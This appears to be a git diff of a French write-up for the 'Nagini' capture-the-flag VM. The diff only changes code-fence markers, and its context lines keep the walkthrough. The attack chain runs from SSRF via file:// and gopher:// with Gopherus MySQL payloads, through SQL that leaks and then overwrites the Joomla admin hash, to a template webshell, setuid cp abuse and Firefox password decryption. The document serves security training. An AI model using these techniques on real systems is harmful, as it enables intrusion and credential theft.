@@ -12,7 +12,7 @@ L'occasion d'en extraire les 3 horcrux suivants et de continuer l'aventure.
 
 Pas plus de matière en quantité de services sur cette VM   
 
-```plain
+```
 $ sudo nmap -sC -sV -T5 -p- 192.168.2.14
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -30,7 +30,7 @@ La présentation du site web est similaire à l'épisode précédent dans le sen
 
 Via énumération on découvre un CMS Joomla présent :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.2.14/ -w DirBuster-0.12/directory-list-2.3-big.txt -n
 
  ___  ___  __   __     __      __         __   ___
@@ -67,7 +67,7 @@ Qu'est-ce que j'ai sous la main pour tester du Joomla ? Un petit coup de *locate
 
 A l'aide des wordlists je parvient à énumérer les entrées suivantes :  
 
-```plain
+```
 200       22l      123w     2204c http://192.168.2.14/joomla/components/com_content/
 200       16l       60w     1000c http://192.168.2.14/joomla/components/com_media/
 200       21l      113w     1996c http://192.168.2.14/joomla/components/com_mailto/
@@ -116,7 +116,7 @@ docker run --rm -it -v /tmp:/home/joomscan/reports --name joomscan_cli  rezasp/j
 
 Le résultat est déjà plus à la hauteur de mes espérances :  
 
-```plain
+```
 [+] Detecting Joomla Version
 [++] Joomla 3.9.25
 
@@ -260,7 +260,7 @@ Force est de constater que j'ai raté un élément lors de l'énumération. *Fer
 $ feroxbuster -u http://192.168.2.14/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -x html,php,txt
 ```
 
-```plain
+```
 Hello developers!!
 
 I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
@@ -296,7 +296,7 @@ python examples/http3_client.py -k https://quic.nagini.hogwarts/ --output-dir dl
 
 On obtient le message suivant :  
 
-```plain
+```
 Greetings Developers!!
 
 I am having two announcements that I need to share with you:
@@ -321,7 +321,7 @@ Dans un premier temps il faut pouvoir déterminer quel type de client est utilis
 
 Si je soumet */etc/passwd* rien n'est retourné. En revanche en demandant *file:///etc/passwd* ça fonctionne :  
 
-```plain
+```
 --- snip ---
 snape:x:1000:1000:Snape,,,:/home/snape:/bin/bash
 ron:x:1001:1001::/home/ron:/bin/sh
@@ -365,7 +365,7 @@ echo $exec;
 
 Parfait ! La protection SSRF doit faire référence au filtrage réseau. Pour le reste on est libre de switcher sur un autre schéma pour les URLs soumises et d'après la page de manuel de cURL il y en a beaucoup :  
 
-```plain
+```
 DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT,
  POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP
 ```
@@ -380,7 +380,7 @@ curl gopher://127.0.0.1:8000/_OPTIONS%20/%20HTTP/1.0%0d%0a%0d%0a
 
 Le netcat devrait réagir de cette manière :  
 
-```plain
+```
 $ ncat -l -p 8000 -v
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::8000
@@ -403,7 +403,7 @@ Le code de [Gopherus](https://github.com/tarunkant/Gopherus/blob/master/scripts/
 
 L'utilisation prend ces formes :  
 
-```plain
+```
 $ python gopherus.py --exploit mysql
 
   ________              .__
@@ -460,7 +460,7 @@ Après la config faite j'ai récupéré un shell sur le container MySQL (*docker
 
 J'ai ensuite fait un simple *grep* sur le dump pour retrouver un élément affiché sur la page d'accueil du Joomla, en l’occurrence j'avais *Cassiopeia* qui semble correspondre au thème par défaut :  
 
-```plain
+```
 INSERT INTO `joomla_template_styles` VALUES 
 (11,'cassiopeia',0,'1','Cassiopeia - Default',0,'','{\"brand\":\"1\",\"logoFile\":\"\",\"siteTitle\":\"\",\"siteDescription\":\"\",
 --- snip ---
@@ -470,7 +470,7 @@ INSERT INTO `joomla_template_styles` VALUES
 
 Finalement cette table a attiré mon attention :  
 
-```plain
+```
 CREATE TABLE `joomla_menu` (
   `id` int NOT NULL AUTO_INCREMENT,
   `menutype` varchar(24) COLLATE utf8mb4_unicode_ci NOT NULL',
@@ -494,7 +494,7 @@ CREATE TABLE `joomla_menu` (
 
 Tout particulièrement cet enregistrement :  
 
-```plain
+```
 (101,'mainmenu','Home','home','','home','index.php?option=com_content&view=featured','component',--- snip ---
 ```
 
@@ -502,13 +502,13 @@ Il s'agit du menu affiché à la droite de la page d'accueil. Le texte *Home* es
 
 Je teste simplement la requête suivante :  
 
-```plain
+```
 update joomla.joomla_menu set title = 'HiThere' where title = 'Home';
 ```
 
 Bingo ! J'obtiens la modification espérée sur la page. Pus qu'à y placer le password de l'administrateur :  
 
-```plain
+```
 update joomla.joomla_menu set title = (select password from joomla.joomla_users where email = 'site_admin@nagini.hogwarts') where title = 'HiThere';
 ```
 
@@ -516,7 +516,7 @@ update joomla.joomla_menu set title = (select password from joomla.joomla_users 
 
 Le hash semble assez corsé à casser, il faut dire déjà que c'est du *brcrypt*. A la place je récupère le hash présent dans mon conteneur MySQL et dont je connais le clair (*mysuperpassword*) et j'écrase celui du CTF :  
 
-```plain
+```
 update joomla.joomla_users set password = '$2y$10$JjZOcbgpLz4wRxFKcULpCeJloGZ06lMMr7C0Rt6WkiQJWnMmiA0Gm' where email = 'site_admin@nagini.hogwarts';
 ```
 
@@ -527,19 +527,19 @@ Je ne suis pas un expert Joomla mais l'appli permet d'éditer des fichiers du CM
 
 Ainsi l'URL *http://192.168.2.14/joomla/templates/protostar/?cmd=id* me retourne :  
 
-```plain
+```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 Avec la commande *find* je retrouve un premier horcrux (*/var/www/html/horcrux1.txt*) appartenant à l'utilisateur *ron* :  
 
-```plain
+```
 horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
 ```
 
 Dans le dossier de l'utilisateur *snape* je retrouve des identifiants :  
 
-```plain
+```
 -rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
 ```
 
@@ -547,7 +547,7 @@ Une fois décodé (c'est du base64) j'obtiens le mot de passe *Love@lilly* qui m
 
 Le second horcrux est présent dans le dossier de *hermoine*. On ne peut pas le lire faute de permissions mais une copie du binaire *cp* a été laissé avec les droits setuid de l'utilisatrice :  
 
-```plain
+```
 snape@Nagini:/home/hermoine$ cat horcrux2.txt 
 cat: horcrux2.txt: Permission denied
 snape@Nagini:/home/hermoine$ ls -l horcrux2.txt 
@@ -563,7 +563,7 @@ horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
 
 Il est possible d'utiliser ce même exécutable pour ajouter notre clé publique SSH aux clés autorisées :  
 
-```plain
+```
 snape@Nagini:/tmp$ ~hermoine/bin/su_cp authorized_keys ~hermoine/.ssh/
 snape@Nagini:/tmp$ ls -al  ~hermoine/.ssh/
 total 12
@@ -579,7 +579,7 @@ On ne trouve pas plus d'indices classiques pouvant mener à de l'escalade de pri
 
 Je rapatrie le dossier via scp et je lance [firefox\_decrypt](https://github.com/Unode/firefox_decrypt) dessus :  
 
-```plain
+```
 $ python3 firefox_decrypt.py firefox/
 Traceback (most recent call last):
   File "firefox_decrypt.py", line 46, in <module>
@@ -589,7 +589,7 @@ TypeError: 'type' object is not subscriptable
 
 Un petit fix et une [pull request](https://github.com/unode/firefox_decrypt/pull/78/files) plus tard :
 
-```plain
+```
 $ python3 firefox_decrypt.py firefox/
 
 Website:   http://nagini.hogwarts
@@ -599,7 +599,7 @@ Password: '@Alohomora#123'
 
 Ce qui permet l'accès root et la récupération du dernier horcrux :  
 
-```plain
+```
 # cat horcrux3.txt 
   ____                            _         _       _   _                 
  / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
